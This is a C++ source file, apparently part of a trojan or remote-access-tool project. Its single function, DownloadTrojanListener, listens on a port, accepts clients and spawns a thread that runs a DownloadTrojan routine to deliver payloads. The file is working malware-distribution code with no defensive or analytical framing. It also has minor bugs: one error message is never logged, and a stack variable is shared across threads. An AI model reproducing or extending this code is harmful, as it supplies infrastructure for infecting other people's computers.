

#include <windows.h>
#include <WinSock.h>
#include "main.h"
#include "Public.h"
#include "DownloadTrojanrecver.h"
#include "network.h"


DWORD __stdcall DownloadTrojanListener() {

	int ret = 0;

	int s = Network::listenPort(DOWNLOADTROJAN_PORT);

	SOCKADDR_IN siclient = { 0 };
	while (TRUE) {
		int addrlen = sizeof(SOCKADDR_IN);
		SOCKET sockclient = accept(s, (sockaddr*)&siclient, &addrlen);
		if (sockclient != INVALID_SOCKET)
		{
			DWORD dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
			if (setsockopt(sockclient, SOL_SOCKET, SO_RCVTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
			{
				char szShowInfo[512];
				wsprintfA(szShowInfo, "DownloadTrojanListener recv time setsockopt error code:%u\r\n", GetLastError());
				WriteLog(szShowInfo);
				continue;
			}

			dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
			if (setsockopt(sockclient, SOL_SOCKET, SO_SNDTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
			{
				char szShowInfo[512];
				wsprintfA(szShowInfo, "DownloadTrojanListener send time setsockopt error code:%u\r\n", GetLastError());
				continue;
			}

			NETWORKPROCPARAM stparam = { 0 };
			stparam.stAddrClient = siclient;
			stparam.hSockClient = sockclient;
			ret = GetCurrentDirectoryA(MAX_PATH, stparam.szCurrentPath);
			if (ret) {
				HANDLE h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DownloadTrojan, &stparam, 0, 0);
				CloseHandle(h);
			}
			continue;
		}
		else {
			WriteLog("DownloadTrojanListener accept error\r\n");
			continue;
		}
	}
	return TRUE;
}